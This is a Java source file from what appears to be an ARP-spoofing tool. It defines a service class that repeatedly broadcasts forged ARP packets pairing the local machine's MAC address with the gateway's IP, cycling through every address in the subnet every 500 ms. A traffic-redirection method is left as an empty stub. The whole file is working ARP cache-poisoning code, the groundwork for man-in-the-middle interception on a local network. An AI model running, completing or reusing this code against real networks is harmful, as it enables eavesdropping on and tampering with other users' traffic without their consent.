package org.bitducks.spoofing.services;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.scan.IpRangeIterator;
import org.bitducks.spoofing.util.IpUtil;
import org.bitducks.spoofing.util.gateway.GatewayFinder;

public class BroadcastARPService extends Service {
	NetworkInterface servInterface;
	IpRangeIterator iterator;
	
	public BroadcastARPService() {
		servInterface = Server.getInstance().getNetworkInterface();
		InetAddress firstIp = IpUtil.network(servInterface.addresses[0]);
		InetAddress lastIp = IpUtil.lastIpInNetwork(servInterface.addresses[0]);
		iterator = new IpRangeIterator(firstIp, lastIp);
	}
	
	@Override
	public void run() {
		while(! this.isCloseRequested()){
			spoofedPackage();
			redirectTraffic();
			
			//Waiting 500ms to be sure we don't use all the CPU
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	private InetAddress getNextIp() {
		if(! iterator.hasNext()) {
			iterator.reset();
		}
		return iterator.next();
	}

	private void spoofedPackage() {
		try {
			
			InetAddress gateway = GatewayFinder.find(servInterface);

			ARPPacket spoofedPacket = PacketFactory.arpRequest(servInterface.mac_address, gateway, getNextIp());

			Server.getInstance().sendPacket(spoofedPacket);
			
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private void redirectTraffic() {
		// TODO Auto-generated method stub
		
	}
}
